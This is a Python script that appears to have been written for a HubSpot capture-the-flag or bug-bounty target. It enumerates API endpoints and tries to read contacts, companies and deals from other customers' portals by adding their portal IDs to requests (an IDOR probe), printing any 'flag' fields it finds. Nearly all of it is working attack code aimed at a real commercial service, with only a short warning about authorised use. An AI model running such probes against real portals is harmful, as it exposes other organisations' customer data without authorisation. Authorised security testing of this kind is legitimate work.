#!/usr/bin/env python3
"""
HubSpot Portal Enumeration Script
Attempts to enumerate accessible portals and test for cross-portal access
"""

import requests
import json
import sys
from typing import List, Dict

class HubSpotPortalTester:
    def __init__(self, api_key: str, your_portal_id: str):
        self.api_key = api_key
        self.your_portal_id = your_portal_id
        self.base_url = "https://api.hubapi.com"
        self.session = requests.Session()
        self.session.headers.update({
            'Authorization': f'Bearer {api_key}',
            'Content-Type': 'application/json'
        })
    
    def test_portal_access(self, target_portal_id: str) -> Dict:
        """Test if we can access data from a different portal"""
        results = {
            'portal_id': target_portal_id,
            'accessible': False,
            'endpoints_tested': [],
            'successful_endpoints': []
        }
        
        # List of API endpoints to test
        test_endpoints = [
            f'/contacts/v1/lists/all/contacts/all?portalId={target_portal_id}',
            f'/companies/v2/companies/paged?portalId={target_portal_id}',
            f'/deals/v1/deal/paged?portalId={target_portal_id}',
            f'/crm/v3/objects/contacts?portalId={target_portal_id}',
        ]
        
        for endpoint in test_endpoints:
            url = f"{self.base_url}{endpoint}"
            results['endpoints_tested'].append(endpoint)
            
            try:
                response = self.session.get(url, timeout=10)
                
                if response.status_code == 200:
                    print(f"[+] POTENTIAL VULNERABILITY: {endpoint}")
                    print(f"    Status: {response.status_code}")
                    print(f"    Response length: {len(response.text)}")
                    results['successful_endpoints'].append({
                        'endpoint': endpoint,
                        'status': response.status_code,
                        'response_snippet': response.text[:200]
                    })
                    results['accessible'] = True
                elif response.status_code == 403:
                    print(f"[-] Forbidden: {endpoint}")
                elif response.status_code == 404:
                    print(f"[-] Not Found: {endpoint}")
                else:
                    print(f"[?] Unexpected status {response.status_code}: {endpoint}")
                    
            except Exception as e:
                print(f"[!] Error testing {endpoint}: {str(e)}")
        
        return results
    
    def test_contact_access(self, contact_vid: str, target_portal: str = None) -> Dict:
        """Test direct contact access with optional portal parameter"""
        results = {
            'contact_vid': contact_vid,
            'accessible': False,
            'methods': []
        }
        
        # Different ways to try accessing the contact
        test_methods = [
            {
                'name': 'Direct VID access',
                'url': f'/contacts/v1/contact/vid/{contact_vid}/profile'
            },
            {
                'name': 'CRM v3 access',
                'url': f'/crm/v3/objects/contacts/{contact_vid}'
            }
        ]
        
        # If target portal specified, add it as parameter
        if target_portal:
            test_methods.extend([
                {
                    'name': 'VID with portalId param',
                    'url': f'/contacts/v1/contact/vid/{contact_vid}/profile?portalId={target_portal}'
                },
                {
                    'name': 'CRM v3 with portalId param',
                    'url': f'/crm/v3/objects/contacts/{contact_vid}?portalId={target_portal}'
                }
            ])
        
        for method in test_methods:
            url = f"{self.base_url}{method['url']}"
            
            try:
                response = self.session.get(url, timeout=10)
                method['status_code'] = response.status_code
                
                if response.status_code == 200:
                    print(f"[+] SUCCESS: {method['name']}")
                    print(f"    Response preview: {response.text[:300]}")
                    
                    # Try to extract flags if present
                    try:
                        data = response.json()
                        if 'properties' in data:
                            props = data['properties']
                            if 'firstname' in props:
                                print(f"    [FLAG] firstname: {props['firstname'].get('value', 'N/A')}")
                            if 'super_secret' in props:
                                print(f"    [FLAG] super_secret: {props['super_secret'].get('value', 'N/A')}")
                    except:
                        pass
                    
                    method['accessible'] = True
                    results['accessible'] = True
                else:
                    print(f"[-] Failed: {method['name']} - Status {response.status_code}")
                    method['accessible'] = False
                
                results['methods'].append(method)
                
            except Exception as e:
                print(f"[!] Error with {method['name']}: {str(e)}")
                method['error'] = str(e)
                results['methods'].append(method)
        
        return results
    
    def enumerate_api_endpoints(self):
        """Enumerate common API endpoints to understand structure"""
        print("\n[*] Enumerating API endpoints...")
        
        endpoints = [
            '/contacts/v1/lists/all/contacts/all',
            '/contacts/v2/contacts',
            '/crm/v3/objects/contacts',
            '/companies/v2/companies/paged',
            '/deals/v1/deal/paged',
            '/crm-objects/v1/objects/contacts',
        ]
        
        for endpoint in endpoints:
            url = f"{self.base_url}{endpoint}"
            try:
                response = self.session.get(url, params={'count': 1}, timeout=10)
                print(f"[{response.status_code}] {endpoint}")
                if response.status_code == 200:
                    print(f"     Response preview: {response.text[:150]}...")
            except Exception as e:
                print(f"[!] {endpoint}: {str(e)}")


def main():
    print("="*60)
    print("HubSpot Portal Enumeration & IDOR Testing Script")
    print("="*60)
    print()
    print("  WARNING: Only test on portals you own or have permission to test!")
    print("  This script is for educational and authorized testing only.")
    print()
    
    # Get configuration
    api_key = input("Enter your HubSpot API key: ").strip()
    your_portal_id = input("Enter your portal ID: ").strip()
    
    tester = HubSpotPortalTester(api_key, your_portal_id)
    
    while True:
        print("\n" + "="*60)
        print("Select test:")
        print("1. Enumerate your API endpoints")
        print("2. Test cross-portal access (CTF: 46962361)")
        print("3. Test custom portal access")
        print("4. Test direct contact access")
        print("5. Exit")
        print("="*60)
        
        choice = input("\nEnter choice (1-5): ").strip()
        
        if choice == '1':
            tester.enumerate_api_endpoints()
            
        elif choice == '2':
            print("\n[*] Testing access to CTF portal 46962361...")
            result = tester.test_portal_access('46962361')
            if result['accessible']:
                print("\n[!] POTENTIAL VULNERABILITY FOUND!")
                print("[!] You may have cross-portal access!")
                print(f"[!] Successful endpoints: {len(result['successful_endpoints'])}")
            else:
                print("\n[-] No cross-portal access found (expected)")
                
        elif choice == '3':
            target_portal = input("Enter target portal ID to test: ").strip()
            print(f"\n[*] Testing access to portal {target_portal}...")
            result = tester.test_portal_access(target_portal)
            if result['accessible']:
                print("\n[!] POTENTIAL VULNERABILITY FOUND!")
                
        elif choice == '4':
            contact_vid = input("Enter contact VID to test: ").strip()
            target_portal = input("Enter target portal ID (or leave empty): ").strip()
            print(f"\n[*] Testing access to contact {contact_vid}...")
            result = tester.test_contact_access(
                contact_vid, 
                target_portal if target_portal else None
            )
            if result['accessible']:
                print("\n[!] SUCCESS - Contact accessed!")
                
        elif choice == '5':
            print("\n[*] Exiting...")
            break
        else:
            print("\n[!] Invalid choice")
        
        input("\nPress Enter to continue...")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
